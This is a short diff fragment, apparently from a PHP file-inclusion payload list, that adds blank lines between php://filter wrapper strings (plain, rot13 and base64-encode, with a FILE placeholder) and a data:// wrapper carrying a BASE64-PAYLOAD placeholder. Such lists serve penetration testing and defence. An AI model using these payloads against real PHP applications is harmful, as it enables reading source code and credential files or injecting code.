@@ -12,7 +12,11 @@ require_once
 
 
 php://filter/resource=FILE
+
+
 php://filter/read=string.rot13/resource=FILE
+
+
 php://filter/convert.base64-encode/resource=FILE
 
 data://text/plain;base64,BASE64-PAYLOAD
